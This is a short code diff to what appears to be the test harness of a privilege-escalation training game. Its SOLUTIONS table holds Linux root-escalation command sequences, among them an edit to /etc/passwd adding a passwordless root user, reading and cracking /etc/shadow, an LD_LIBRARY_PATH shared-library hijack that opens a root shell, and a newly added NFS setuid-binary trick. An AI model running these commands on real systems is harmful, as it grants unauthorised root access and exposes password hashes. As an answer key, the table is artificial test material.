@@ -51,7 +51,7 @@ function loadLevel(level) {
         env: { PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
         isRoot: false, hintIndex: 0, tmpBins: {}, pendingCron: false,
         cronPayload: null, cmdCount: 0, startTime: Date.now(),
-        blueTeam: false, sudoAuthed: false,
+        blueTeam: false, sudoAuthed: false, nfsMount: null,
     });
     sandbox.TERM = sandbox.TERM || { history: [] };
     sandbox.TERM.history = [];
@@ -82,6 +82,7 @@ const SOLUTIONS = {
     20: ["echo 'r00t::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd", 'su r00t'],
     21: ["python3 -c \"print(open('/etc/shadow').read())\"", 'john /tmp/shadow.copy', 'su root'],
     22: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/libagent.so.1.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c', 'sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'],
+    23: ['showmount -e', 'mount -t nfs box-23:/srv/backups /mnt', 'touch /srv/backups/rootbash', 'chmod u+s /srv/backups/rootbash', '/srv/backups/rootbash'],
 };
 
 let pass = 0, fail = 0;
